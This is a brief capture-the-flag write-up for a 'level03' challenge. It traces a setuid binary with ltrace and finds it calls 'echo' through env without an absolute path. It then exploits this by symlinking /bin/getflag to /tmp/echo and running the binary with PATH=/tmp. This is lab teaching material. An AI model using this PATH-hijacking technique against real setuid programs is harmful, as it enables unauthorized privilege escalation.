## level03

This level introduces [linux binary analyzers](https://opensource.com/article/20/4/linux-binary-analysis)

Also, it's highly recommend to get fimiliar with [setgid, setuid and sticky bit](https://ruvds.com/ru/helpcenter/suid-sgid-sticky-bit-linux/)

First, looking at the level03 library-function traces.
```bash
ltrace ./level03
```

Result:
```C
...
system("/usr/bin/env echo Exploit me")
...
```

We see that `echo` is not called with the absolute path. <br>
Also, the enviroment obtained from the env call. <br>
These lead us to the idea, that we can exploit it using binary substitution.<br>
```bash
# 1. Creating symbolic link to getflag from echo 
ln -s /bin/getflag /tmp/echo

# 2. Calling executable replacing the path where the executable file will be searched
PATH=/tmp ./level03
```